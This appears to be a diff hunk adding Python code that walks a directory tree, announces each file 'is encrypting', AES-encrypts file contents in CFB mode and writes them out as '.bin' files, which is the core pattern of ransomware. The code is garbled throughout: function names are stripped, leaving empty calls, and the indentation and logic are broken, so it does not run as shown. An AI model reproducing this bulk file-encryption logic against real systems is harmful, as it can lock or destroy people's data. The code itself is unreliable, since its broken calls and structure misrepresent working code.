@@ -1,0 +1,16 @@
+    for root, _, files in ("."):
+            file_path = (root, file)
+            (file_path + " is encrypting.")
+            (file_path)
+    with (path) as f:
+        plain_text = ()
+    iv = ().read(AES.block_size)
+    mycipher = (key, AES.MODE_CFB, iv)
+    ciphertext = iv + (plain_text.encode())
+    with (path + ".bin", "wb") as file_out:
+        (ciphertext[16:])
+if (path) and os.path.exists(path):
+    (path)
+elif (path) and os.path.exists(path):
+    (path)
+    ("it's a special file(socket,FIFO,device file)")
